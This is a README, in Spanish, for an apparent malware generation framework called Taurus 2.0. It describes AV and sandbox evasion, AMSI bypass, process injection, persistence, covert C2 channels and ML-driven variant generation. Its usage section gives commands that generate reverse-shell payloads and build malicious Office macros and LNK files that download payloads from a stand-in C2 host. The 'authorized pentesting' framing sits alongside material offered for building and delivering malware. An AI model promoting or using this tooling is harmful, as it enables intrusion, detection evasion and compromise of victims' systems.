# 🐂 TAURUS 2.0

## Advanced ML-Powered Malware Generation Framework

**Framework de generación de malware con inteligencia artificial para investigación de seguridad y pentesting autorizado**

[![Python](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/)
[![Tests](https://img.shields.io/badge/tests-100%25-brightgreen.svg)](tests/)
[![Features](https://img.shields.io/badge/features-80+-orange.svg)](docs/ADVANCED_FEATURES_SUMMARY.md)
[![License](https://img.shields.io/badge/license-Educational-red.svg)](LICENSE)

---

## 🎯 Descripción General

Taurus 2.0 es un framework avanzado de generación de malware que combina técnicas tradicionales de evasión con inteligencia artificial y aprendizaje automático. Diseñado específicamente para profesionales de seguridad ofensiva, investigadores y equipos de red team, Taurus proporciona un conjunto completo de herramientas para generar, optimizar y evaluar payloads con capacidades de evasión de última generación.

### Características Principales

- **80+ técnicas de evasión** implementadas y probadas
- **Motor de IA/ML** con GAN, Reinforcement Learning y optimización evolutiva
- **15 módulos especializados** cubriendo todos los aspectos de generación de malware
- **Testing automatizado** con 100% de cobertura y CI/CD integrado
- **CLI unificado** para acceso rápido a todas las funcionalidades
- **7,800+ líneas de código** optimizado y documentado

---

## 🏗️ Arquitectura del Sistema

### Componentes Principales

```
┌─────────────────────────────────────────────────────────────┐
│                    TAURUS 2.0 FRAMEWORK                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐    │
│  │   Evasion    │  │  Injection   │  │ Persistence  │    │
│  │   Engine     │  │   Engine     │  │   Manager    │    │
│  └──────────────┘  └──────────────┘  └──────────────┘    │
│                                                             │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐    │
│  │  Obfuscation │  │ Cryptography │  │   Packing    │    │
│  │   Engine     │  │   Engine     │  │   Engine     │    │
│  └──────────────┘  └──────────────┘  └──────────────┘    │
│                                                             │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐    │
│  │   Fileless   │  │     C2       │  │   Exploit    │    │
│  │  Execution   │  │  Protocols   │  │  Templates   │    │
│  └──────────────┘  └──────────────┘  └──────────────┘    │
│                                                             │
│  ┌─────────────────────────────────────────────────────┐  │
│  │           ML/AI Optimization Engine                 │  │
│  │  • GAN • Reinforcement Learning • Evolution         │  │
│  └─────────────────────────────────────────────────────┘  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 📦 Capacidades Técnicas

### 1. Evasión Avanzada (40+ técnicas)

#### Anti-Análisis
- **VM Detection**: 25+ métodos (registry, hardware, timing, CPUID)
- **Debugger Detection**: 15+ técnicas (PEB, timing, breakpoints)
- **Sandbox Detection**: Análisis de comportamiento y artifacts

#### Técnicas de Evasión
- **Direct Syscalls**: Bypass de hooks en user-mode
- **API Unhooking**: Detección y eliminación de hooks
- **Heaven's Gate**: Switching x86/x64 para evasión
- **Memory Evasion**: Manipulación de permisos RW/RX
- **PPID Spoofing**: Falsificación de proceso padre

### 2. Inyección de Código (8+ métodos)

- **Reflective DLL Injection**: Carga de DLLs desde memoria
- **Process Doppelgänging**: Abuso de transacciones NTFS
- **Atom Bombing**: Inyección vía global atom table
- **Thread Hijacking**: Modificación de contexto de threads
- **EWM Injection**: Abuso de SetWindowLongPtr
- **APC Queue Injection**: Inyección asíncrona
- **Process Hollowing**: Múltiples variantes

### 3. Persistencia (15+ mecanismos)

- **Registry**: 15 ubicaciones diferentes
- **WMI Event Subscriptions**: Persistencia basada en eventos
- **Scheduled Tasks**: Tareas ocultas y avanzadas
- **Services**: Instalación sigilosa de servicios
- **DLL/COM Hijacking**: Secuestro de carga de bibliotecas

### 4. Ejecución Fileless (30+ técnicas)

#### PowerShell
- 5 capas de ofuscación
- 3 métodos de bypass AMSI
- 15+ download cradles

#### LOLBins (Living-off-the-Land)
- 20+ binarios nativos de Windows
- Regsvr32, Rundll32, Mshta, Certutil
- Installutil, Msbuild, Wmic, etc.

### 5. Protocolos C2 (10+ protocolos)

- **DNS over HTTPS (DoH)**: C2 sobre DNS cifrado
- **ICMP Tunneling**: Túnel sobre ping
- **SMB Beaconing**: C2 en redes internas
- **WebSocket**: Conexiones persistentes
- **Tor Integration**: Anonimato completo
- **Domain Fronting**: Ocultación vía CDN
- **Steganography**: Canal encubierto en imágenes

### 6. Criptografía (8+ algoritmos)

- **Simétrica**: AES-256-GCM, ChaCha20-Poly1305
- **Asimétrica**: RSA 2048/4096, ECC (P-256)
- **Key Exchange**: Diffie-Hellman, ECDH
- **Steganography**: LSB embedding/extraction
- **Multi-layer**: Hasta 10 capas de cifrado

### 7. Empaquetado Avanzado

- **Compresión**: Zlib, LZMA, algoritmos custom
- **Anti-Unpacking**: Detección de análisis
- **Multi-Stage**: Carga por etapas
- **Obfuscación**: Integrada en el packer

### 8. Inteligencia Artificial

#### GAN (Generative Adversarial Network)
- Generación de variantes únicas
- Arquitectura de 3 capas
- Training adversarial

#### Reinforcement Learning
- Q-Learning para optimización
- Estrategias adaptativas
- Aprendizaje continuo

#### Optimización Evolutiva
- Algoritmos genéticos
- 50+ generaciones
- Fitness multi-objetivo

---

## 🚀 Instalación

### Requisitos

- Python 3.8 o superior
- Windows 10/11 (algunas características)
- 4GB RAM mínimo
- 1GB espacio en disco

### Instalación Rápida

```bash
# Clonar repositorio
git clone https://github.com/yourusername/taurus.git
cd taurus

# Crear entorno virtual (recomendado)
python -m venv venv
source venv/bin/activate  # Linux/Mac
# o
venv\Scripts\activate  # Windows

# Instalar dependencias
pip install -r requirements.txt

# Verificar instalación
python cli_unified.py status
```

### Dependencias Principales

- `numpy` - Computación numérica
- `click` - Framework CLI
- `rich` - UI de terminal
- `pycryptodome` - Criptografía
- `pillow` - Procesamiento de imágenes
- `psutil` - Información del sistema

---

## 💻 Uso

### CLI Unificado

```bash
# Ver todas las características
python cli_unified.py features

# Ver estado del sistema
python cli_unified.py status

# Ejecutar tests
python cli_unified.py test
```

### Generación de Payloads

```bash
# Payload básico
python cli.py generate \
  --type reverse_shell \
  --lhost 192.168.1.10 \
  --lport 4444

# Con evasión avanzada
python cli.py generate \
  --type reverse_shell \
  --lhost 192.168.1.10 \
  --lport 4444 \
  --obfuscation-level 10 \
  --evasion advanced
```

### Empaquetado y Cifrado

```bash
# Empaquetar con LZMA y AES
python cli_unified.py pack \
  -p payload.exe \
  -c lzma \
  -e aes \
  --anti-debug \
  -o packed.bin

# Generar variantes
python cli_unified.py variants \
  -p payload.bin \
  -c 100 \
  -o variants/
```

### Generación de Exploits

```bash
# Macro de Office
python cli_unified.py exploit \
  -t macro \
  -u http://c2.example.com/payload.exe \
  --obfuscation 10 \
  -o delivery.vba

# LNK malicioso
python cli_unified.py exploit \
  -t lnk \
  -u http://c2.example.com/payload.ps1 \
  -o shortcut.ps1
```

### Optimización con IA

```python
from ml_engine.evasion_optimizer import get_evasion_optimizer

# Inicializar optimizador
optimizer = get_evasion_optimizer()

# Encontrar configuración óptima
optimal_config = optimizer.find_optimal_configuration(
    payload_data,
    generations=50
)

# Ver reporte
print(optimizer.get_optimization_report())
```

---

## 🧪 Testing

### Suite de Tests

```bash
# Tests automatizados (CI/CD)
python tests/test_automated.py

# Tests de características avanzadas
python tests/test_advanced_features.py

# Tests de ML/IA
python tests/test_ml_engine.py

# Ver reporte HTML
start test_report.html  # Windows
open test_report.html   # Mac
xdg-open test_report.html  # Linux
```

### Resultados

- **Total Tests**: 30+
- **Success Rate**: 100%
- **Coverage**: Completa
- **Performance**: Optimizado

---

## 📚 Documentación

### Documentos Principales

- **[Características Avanzadas](docs/ADVANCED_FEATURES_SUMMARY.md)** - Lista completa de 80+ características
- **[Mejora Continua](docs/MEJORA_CONTINUA_FINAL.md)** - Sistema de CI/CD
- **[IA/ML](docs/MEJORAS_IA_ML.md)** - Componentes de inteligencia artificial
- **[Implementación](docs/IMPLEMENTACION_COMPLETA.md)** - Detalles técnicos

### Estructura del Proyecto

```
Taurus/
├── evasion/          # Técnicas de evasión
├── injection/        # Métodos de inyección
├── persistence/      # Mecanismos de persistencia
├── generators/       # Generadores de payloads
├── obfuscation/      # Ofuscación de código
├── utils/            # Utilidades
├── exploits/         # Plantillas de exploits
├── ml_engine/        # Motor de IA/ML
├── tests/            # Suite de tests
├── docs/             # Documentación
└── examples/         # Ejemplos de uso
```

---